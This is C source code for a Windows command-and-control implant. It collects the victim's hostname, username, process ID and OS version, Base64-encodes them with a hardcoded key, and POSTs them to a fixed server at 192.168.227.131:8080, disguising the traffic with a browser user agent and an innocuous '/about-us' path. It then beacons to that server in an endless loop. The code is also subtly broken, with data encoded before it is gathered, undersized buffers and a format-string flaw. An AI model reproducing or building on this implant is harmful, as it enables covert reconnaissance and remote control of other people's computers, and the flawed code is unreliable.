#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>

struct job_registration {
    CHAR hostname[MAX_PATH];
    CHAR username[MAX_PATH];
    DWORD process_id;
    DWORD version;
}job;

struct agent_information {
    CHAR *address;
    CHAR *user_agent;
    INT port;
    CHAR *path;
    CHAR *key;
    CHAR *identifier;
}agent;

BOOL Registration(CHAR **cookie) {
    DWORD hostname_length = 260;
    DWORD username_buffer = 260;

    agent.address = "192.168.227.131";
    agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
    agent.port = 8080;
    agent.path = "/about-us";
    agent.key = "boondoggle";
    agent.identifier = "register";

    CHAR *format = "%s:%s,%s,%d,%d,%s";
    
    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
    sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);

    CHAR *data_encode = malloc(strlen(data_to_encode));
    DWORD data_encode_len = strlen(data_to_encode) * 2;
    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);

    DWORD post_buffer_length = strlen(data_encode) + 5;
    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);

    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);

    if (GetComputerNameA(job.hostname, &hostname_length)) {
        printf("Hostname: %s \n", job.hostname);
    }

    if (GetUserNameA(job.username, &username_buffer)) {
        printf("Username: %s \n", job.username);
    }

    if (job.process_id = GetCurrentProcessId()) {
        printf("Process ID: %lu \n", job.process_id);
    }

    if (job.version = GetVersion()) {
        printf("Host Version: %lu \n", job.version);
    }

    HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);

                CHAR *temp_buffer = NULL;
                DWORD buffer_length = 0;
                while (TRUE) {
                    DWORD available_size = 0;
                    DWORD download_buffer;
                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                    if (!available || available_size == 0) {
                        break;
                    }
                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                    memset(temp_buffer, 0, available_size + 1);

                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                    if (!value || download_buffer == 0) {
                        break;
                    }
                    buffer_length += download_buffer;
                    *cookie = (CHAR*)realloc(*cookie, buffer_length + 1);
                    sprintf_s(*cookie, buffer_length + 1, "%s\0", temp_buffer);
                }

                free(temp_buffer);
                temp_buffer = NULL;

                if (hRequest) {
                    InternetCloseHandle(hRequest);
                }
                if (hConnect) {
                    InternetCloseHandle(hConnect);
                }
                if (hInternet) {
                    InternetCloseHandle(hInternet);
                }
            }
        }
    }
    free(post_buffer);
    return TRUE;
}

BOOL Beacon(CHAR  **cookie) {
    CHAR *cmd = NULL;

    agent.address = "192.168.227.131";
    agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
    agent.port = 8080;
    agent.path = "/about-us";
    agent.key = "boondoggle";
    agent.identifier = "beacon";

    CHAR *format = "%s";
    
    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier));
    sprintf(data_to_encode, format, agent.identifier);

    CHAR *data_encode = malloc(strlen(data_to_encode));
    DWORD data_encode_len = strlen(data_to_encode) * 2;
    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);

    DWORD post_buffer_length = strlen(data_encode) + 5;
    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);

    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);

    HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);

                CHAR *temp_buffer = NULL;
                DWORD buffer_length = 0;
                while (TRUE) {
                    DWORD available_size = 0;
                    DWORD download_buffer;
                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                    if (!available || available_size == 0) {
                        break;
                    }
                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                    memset(temp_buffer, 0, available_size + 1);

                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                    if (!value || download_buffer == 0) {
                        break;
                    }
                    buffer_length += download_buffer;
                    *cookie = (CHAR*)realloc(*cookie, buffer_length + 1);
                    sprintf_s(*cookie, buffer_length + 1, "%s\0", temp_buffer);
                }

                free(temp_buffer);
                temp_buffer = NULL;

                if (hRequest) {
                    InternetCloseHandle(hRequest);
                }
                if (hConnect) {
                    InternetCloseHandle(hConnect);
                }
                if (hInternet) {
                    InternetCloseHandle(hInternet);
                }
            }
        }
    }
    free(post_buffer);
    printf("Beaconing");
    return TRUE;
}

void Sleep_Time() {
    int time = 10;
    int percent = 80;
    float jitter = (((time * percent / 100) + (rand() % ((time + (time * percent / 100)) + 1))) * 1000);
    printf("%.6f", jitter);
    Sleep(jitter);
}

int main() {
    CHAR *cookie = NULL;
    Registration(&cookie);
    printf(cookie);
    while(TRUE) {
        Beacon(&cookie);
        // Sleep_Time();
    }
}